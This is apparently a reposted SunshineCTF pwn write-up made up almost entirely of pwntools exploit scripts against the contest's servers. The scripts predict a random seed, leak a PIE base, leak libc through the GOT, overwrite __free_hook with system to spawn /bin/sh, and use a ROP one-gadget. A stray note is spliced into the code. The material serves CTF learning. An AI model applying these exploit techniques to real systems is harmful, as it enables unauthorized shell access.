# SunshineCTF pwn

> 原文: https://www.ctfiot.com/84746.html
> ID: 84746


```
from pwn import *
 
    #p = process('./simulator')
p=remote('sunshinectf.games',22000)
# libc=ELF('./libc.so.6')
context.log_level = 'debug'
context.arch = 'amd64'
from ctypes import *
 
libc=cdll.LoadLibrary("libc.so.6")
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
 
 
sla('team?\n[>] ','11111111111111111111')
ru('11111111111111111111')
seed=u32(p.recv(4))
info('seed->'+hex(seed))
libc.srand(seed)
i=10
while i<=999999999:
    sla('What is it?\n[>] ',str(libc.rand()%i+1))
    i=i*10
p.interactive()
get_bytes(address,count)从address处读取count个字节的内容
from pwn import *
from ctypes import *
import struct
    #context.log_level = 'debug'
    #io = process('./pwn')
context.arch='amd64'
io = remote('sunshinectf.games',22001)
libc = ELF('./libc-2.27.so')
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
rn = lambda x            : io.recvn(x)
sn = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
irt = lambda            : io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
# lg = lambda s,addr        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data        : u32(data.ljust(4, b'\x00'))
uu64 = lambda data        : u64(data.ljust(8, b'\x00'))
    #gdb.attach(io, 'b*$rebase(0x180b)')
payload='r'+'8'*2+'r'*15+'r'*0x40+'b--'+str(0x4)+p8(0xc)+str(3000000000000)
 
 
char_list=b'....\xe2\x99\x9f \xe2\x99\x9e \xe2\x99\x9d \xe2\x99\x9c \xe2\x99\x9b \xe2\x99\x9a \x00\x00\x00\x00Deep(er) Blue(er)\nA (soon to be) very strong chess engine\n\n6rk/1p3p1p/2n2q2/1NQ2p2/3p4/PP5P/5PP1/2R3K1 w - - 0 28\n1. e4 c5 2. c3 d5 3. exd5 Qxd5 4. d4 Nf6 5. Nf3 Bg4 6. Be2 e6 7. h3 Bh5 8. O-O Nc6 9. Be3 cxd4 10. cxd4 Bb4 11. a3 Ba5 12. Nc3 Qd6 13. Nb5 Qe7 14. Ne5 Bxe2 15. Qxe2 O-O 16. Rac1 Rac8 17. Bg5 Bb6 18. Bxf6 gxf6 19. Nc4 Rfd8 20. Nxb6 axb6 21. Rfd1 f5 22. Qe3 Qf6 23. d5 Rxd5 24. Rxd5  exd5 25. b3 Kh8 26. Qxb6 Rg8 27. Qc5 d4 28. Nd6 f4  29. Nxb7  Ne5 30. Qd5 f3 31. g3 Nd3 32. Rc7 Re8 33. Nd6 Re1+ 34. Kh2 Nxf2 35. Nxf7+ Kg7 36. Ng5+ Kh6 37. Rxh7+ 1-0\n\x00\x00\x00\x00\x00'
print(hex(char_list.index('3 Bg')))
def menu(choice):
    sla("> ",str(choice))
 
menu(3)
ru("(soo")
ans=0xd
for i in range(1,6):
    ru("\x1B[")
    t=int(io.recvuntil(';',drop=True))
    ru("m")
    ans+=0x80*(t==30)+(char_list.index(io.recv(4))/4)<<(8*i)
ans-=(0x564e56401d0d-0x564e56400000)
lg("ans")
getflag=ans+0x1349
 
    #print("ans is ----------->",ans)
menu(1)
    #gdb.attach(io, 'b*$rebase(0x18b0)\nb*$rebase(0x15a9)')
io.sendline(payload)
menu(3)
menu(1337)
sla("Make like a knight and jump!\n",str(getflag))
    #gdb.attach(io)
irt()
from pwn import *
 
    #p = process('./elden')
p=remote('sunshinectf.games',22003)
libc=ELF('./libc.so.6')
context.log_level = 'debug'
context.arch = 'amd64'
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
elf=ELF('./elden')
sa('what is thy name? : ','a'*0x20)
sla('What do you tell her before departing?\n: ','bbbb')
sla('3. Attempt to parry the incoming strike\n',str(2))
sla('3. Cast thunderbolt against the Warden\n',str(3))
sla('Leave a message? (y/n): ','y')
sa('Leave your message: ','bbb')
sla('3. Roll to the side\n: ',str(1))
sla('You decide to anger Mergot with a taunt. What do you say to him?\n: ','a'*0x10+p64(elf.got['free']))
sla('emote\n',str(3))
ru('Mergot dropped ')
libcbase=int(p.recv(15))-libc.sym['free']
info('libc->'+hex(libcbase))
system=libcbase+libc.sym['system']
freehook=libcbase+libc.sym['__free_hook']
 
sla('3. Run away from Aethelwulf\n: ',str(2))
sla('critical hit\n',str(2))
sla('Would you like to start NG+? (y/n) : ','y')
sa('What do you tell her before departing?\n: ',p16(1)*8+p64(freehook-8)*30)
sla('3. Attempt to parry the incoming strike\n',str(2))
sla('3. Cast thunderbolt against the Warden\n',str(3))
sla('Leave a message? (y/n): ','y')
sa('Leave your message: ','/bin/sh\x00'+p64(system))
p.interactive()
from pwn import *
 
p = process('./magic')
# p=remote('',)
libc=ELF('./libc-2.31.so')
context.log_level = 'debug'
context.arch = 'amd64'
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
poprdi=0x00000000004023c3
def menu(ch):
    sla('> ',str(ch))
def load(offset,cont,d1,d2,d3):
    menu(2)
    payload=str(offset)+' m '+cont+str(d1)+' '+str(d2)+' '+str(d3)
    sla('Enter cards:',payload)
    sleep(2)
    p.send('\n')
    #gdb.attach(p,'b* 0x401668\nb* 0x401A51\nb* 0x40198E')
 
load(0x14,'aaa ',1,0x405F60,0)
menu(4)
libcbase=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-libc.sym['puts']
info('libc->'+hex(libcbase))
system=libcbase+libc.sym['system']
binsh=libcbase+libc.search('/bin/sh').next()
onegadget=libcbase+0xe3b34
 
load(0x2d,'aaa ',1,onegadget&0xffffffff,onegadget>>32&0xffff)
menu(5)
p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/img_6391e49093df8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/img_6391e4b3cbfeb.png)